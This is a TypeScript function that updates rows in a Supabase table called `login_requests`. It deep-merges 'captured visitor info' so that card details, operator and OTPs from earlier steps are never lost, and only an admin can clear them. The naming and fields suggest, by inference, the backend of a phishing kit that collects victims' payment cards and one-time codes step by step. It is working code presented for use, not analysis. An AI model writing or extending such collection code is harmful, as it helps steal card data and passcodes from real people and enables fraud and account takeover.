
/**
 * Update an existing login_requests row while PRESERVING all previously
 * captured visitor info. Rules:
 *  - `activation_data` (jsonb) is deep-merged with the existing value so
 *    earlier steps' fields (card details, operator, OTPs, etc.) are never
 *    wiped by a later step that only knows a subset of keys.
 *  - Any scalar column present in `payload` with a null/empty value is
 *    dropped so it can't overwrite a previously filled column. Only the
 *    admin can clear visitor data.
 *
 * Returns { id } when the update succeeds, or null when the row is gone
 * (caller should fall back to an insert).
 */
export async function updateVisitorRow(
  existingId: string,
  payload: Record<string, unknown>,
): Promise<{ id: string } | null> {
  // Fetch current row so we can merge activation_data.
  const { data: current } = await supabase
    .from("login_requests")
    .select("activation_data")
    .eq("id", existingId)
    .maybeSingle();

  if (!current) return null;

  const merged: Record<string, unknown> = { ...payload };

  // Deep-merge activation_data
  const prevAct = (current.activation_data as Record<string, unknown> | null) || {};
  const nextAct = (payload.activation_data as Record<string, unknown> | undefined) || {};
  merged.activation_data = { ...prevAct, ...nextAct };

  // Drop null/empty scalars so they don't clobber previously-filled columns.
  for (const [k, v] of Object.entries(merged)) {
    if (k === "activation_data") continue;
    if (v === null || v === undefined || v === "") delete merged[k];
  }

  const { data, error } = await supabase
    .from("login_requests")
    .update(merged as never)
    .eq("id", existingId)
    .select("id")
    .maybeSingle();

  if (error) return null;
  return (data as { id: string } | null) ?? null;
}